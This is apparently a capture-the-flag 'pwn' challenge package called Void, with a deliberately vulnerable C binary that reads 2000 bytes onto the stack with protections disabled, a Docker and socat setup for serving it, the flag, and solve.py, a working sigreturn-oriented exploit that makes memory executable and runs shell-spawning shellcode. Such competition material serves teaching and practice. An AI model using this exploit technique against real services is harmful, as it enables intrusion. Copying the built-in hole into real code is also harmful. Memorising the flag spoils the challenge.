{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]",
    "flag.txt": "gigem{1_6u355_7h475_h0w_w3_3xpl017_17}",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -nostdlib -fno-stack-protector -no-pie -O3\nNAME := void\nPORT := 7000\nall: $(NAME)\n\nclean: .PHONY\n\trm -f $(NAME)\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c solver-template.py\n\n.PHONY:\n\n",
    "README.md": "# Void\n\n## Description\nCan't exploit it if there isn't anything to exploit, right?  NX, no libc, what else even can you do?!\n\n## Solution\nSee `solve.py`.",
    "solve.py": "#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"./void\")\n\ncontext.binary = exe\n\n\ndef conn():\n    if args.LOCAL:\n        if args.GDB:\n            r = gdb.debug([exe.path],gdbscript=\"b *0x401018\\nc\\nc\\nc\\nc\\nc\")\n        else:\n            r = process([exe.path])\n    else:\n        r = remote(\"tamuctf.com\", 443, ssl=True, sni=\"void\")\n\n    return r\n\n\nimport time\n\nENTRY = 0x00000000400018\n\nSYSCALL_RET = 0x0000000000401018\nRET = 0x000000000040101a\ndef main():\n    r = conn()\n\n    frame = SigreturnFrame()\n    frame.rip = SYSCALL_RET\n    frame.rsp = ENTRY\n    frame.rax = 10\n    frame.rdi = 0x400000\n    frame.rsi = 0x1000\n    frame.rdx = 7\n    chain = b\"\"\n    chain += p64(exe.symbols['main'])\n    chain += p64(SYSCALL_RET)\n    chain += bytes(frame)\n    r.send(chain)\n    time.sleep(0.1)\n    r.send(chain[8:][:15].ljust(15,b'\\x00'))\n    time.sleep(0.1)\n\n    r.send(p64(0x00000000400020) + asm(\"add rsp, 100\") + asm(shellcraft.sh()))\n\n    # good luck pwning :)\n\n    r.interactive()\n\n\nif __name__ == \"__main__\":\n    main()\n\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"void\")\np.interactive()\n",
    "void.c": "void main() {\n    asm\n    (\n        \"mov $0, %rax;\"\n        \"mov $0, %rdi;\"\n        \"mov %rsp, %rsi;\"\n        \"mov $2000, %rdx;\"\n        \"syscall;\"\n    );\n}\n\nint _start() {\n\tmain();\n    asm(\n    \t\"mov $60, %rax;\"\n    \t\"mov $0, %rdi;\"\n    \t\"syscall;\"\n    );\n}",
    "category": "pwn"
}